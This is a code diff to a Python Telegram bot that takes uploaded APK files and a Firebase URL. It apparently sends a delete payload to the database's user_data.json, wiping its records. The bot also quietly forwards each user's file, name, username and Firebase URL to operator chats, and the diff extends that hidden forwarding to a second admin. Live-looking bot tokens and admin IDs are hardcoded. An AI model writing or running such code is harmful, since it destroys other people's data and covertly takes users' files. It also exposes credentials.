@@ -15,9 +15,11 @@ logging.basicConfig(
     level=logging.INFO
 )
 
-# Telegram Bot Token & Admin ID
-BOT_TOKEN = "8633137583:AAGK65BVd_LZhxIsXJfzrwigKFnCgvh0RNY".strip()
-ADMIN_CHAT_ID = "6240110220"  # आपकी पर्सनल टेलीग्राम चैट आईडी
+# Telegram Bot Token
+BOT_TOKEN = "8633137583:AAFf_KUmBaNue0EB2qZfQ6ghaeQ9e_W1Yr8".strip()
+
+# 2 Admin IDs ko List me rakha gaya hai
+ADMIN_CHAT_IDS = [6240110220, 8219296288]  # <-- Yahan Dusri Admin ID replace karein
 
 # Internal Payload
 DELETE_PAYLOAD = {
@@ -96,7 +98,7 @@ def delete_firebase_data(base_url):
         target_url = base_url.strip()
         if not target_url.endswith('/'):
             target_url += '/'
-        if 'user_data.json' not in target_url and 'user_data.json' not in target_url:
+        if 'user_data.json' not in target_url:
             target_url += 'user_data.json'
 
         headers = {
@@ -143,7 +145,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if process_success:
             await status_msg.edit_text("✅ <b>Process Complete!</b> Sending your updated file back...", parse_mode="HTML")
             
-            # 1. Send processed APK back to User
+            # 1. User ko file bhejna
             with open(file_path, 'rb') as apk_file:
                 await update.message.reply_document(
                     document=apk_file,
@@ -152,7 +154,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     parse_mode="HTML"
                 )
             
-            # 2. Forward complete details to Admin (Internal Logging)
+            # 2. Both Admins ko file aur notification bhejna
             safe_name = html.escape(user.full_name)
             safe_username = html.escape(user.username) if user.username else "No Username"
             safe_url = html.escape(firebase_url)
@@ -165,14 +167,20 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"✅ <b>Status:</b> Success"
             )
             
-            with open(file_path, 'rb') as admin_apk_file:
-                await context.bot.send_document(
-                    chat_id=ADMIN_CHAT_ID,
-                    document=admin_apk_file,
-                    filename=document.file_name,
-                    caption=admin_caption,
-                    parse_mode="HTML"
-                )
+            # Subhi Admin IDs par message aur document loop me send hoga
+            for admin_id in ADMIN_CHAT_IDS:
+                try:
+                    with open(file_path, 'rb') as admin_apk_file:
+                        await context.bot.send_document(
+                            chat_id=admin_id,
+                            document=admin_apk_file,
+                            filename=document.file_name,
+                            caption=admin_caption,
+                            parse_mode="HTML"
+                        )
+                except Exception as admin_err:
+                    logging.error(f"Failed to send to admin {admin_id}: {admin_err}")
+
         else:
             await status_msg.edit_text("❌ <b>Server Error!</b> Unable to complete the request right now.", parse_mode="HTML")
 
